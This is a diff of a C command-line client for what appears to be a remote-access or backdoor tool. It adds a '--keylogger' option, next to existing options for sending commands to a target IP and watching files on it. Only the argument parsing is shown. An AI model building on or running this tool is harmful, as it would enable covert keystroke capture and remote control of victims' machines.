@@ -13,17 +13,19 @@ static void print_usage(void) {
             "\t--local     -   your local ip\n"
             "\t--tcp       -   use TCP protocol\n"
             "\t--directory -   directory to watch\n"
-            "\t--file      -   file to watch\n");
+            "\t--file      -   file to watch\n"
+            "\t--keylogger -   get keylogger file\n");
 }
 
 static struct option long_options[] = {
-    {"target",    required_argument,  0,  1 },
-    {"command",   required_argument,  0,  2 },
-    {"local",     required_argument,  0,  3 },
-    {"tcp",       optional_argument,  0,  4 },
-    {"directory", required_argument,  0,  5 },
-    {"file",      required_argument,  0,  6 },
-    {0,         0,                  0,  0 }
+    {"target",    required_argument,    0,  1 },
+    {"command",   optional_argument,    0,  2 },
+    {"local",     required_argument,    0,  3 },
+    {"tcp",       optional_argument,    0,  4 },
+    {"directory", optional_argument,    0,  5 },
+    {"file",      optional_argument,    0,  6 },
+    {"keylogger", optional_argument,    0,  7 },
+    {0,         0,                      0,  0 }
 };
 
 int main(int argc, char **argv){
@@ -55,25 +57,35 @@ int main(int argc, char **argv){
 
         switch (arg) {
             case 1:
+                //target ip
                 strncpy(targetip, optarg, BUFSIZ);
                 break;
             case 2:
+                //command string
                 if_command = true;
                 strncpy(data, (unsigned char*)optarg, BUFSIZ);
                 break;
             case 3:
+                //local ip
                 strncpy(localip, optarg, BUFSIZ);
                 break;
             case 4:
+                //if using tcp or udp
                 tcp = true;
                 break;
             case 5:
+                //directory to watch
                 strncpy(directory, optarg, BUFSIZ);
                 if_directory = true;
                 break;
             case 6:
+                //file to watch
                 strncpy(file, optarg, BUFSIZ);
                 if_file = true;
+                break;
+            case 7:
+                //keylogger file
+                if_keylogger = true;
                 break;
             default: /*  '?' */
                 print_usage();
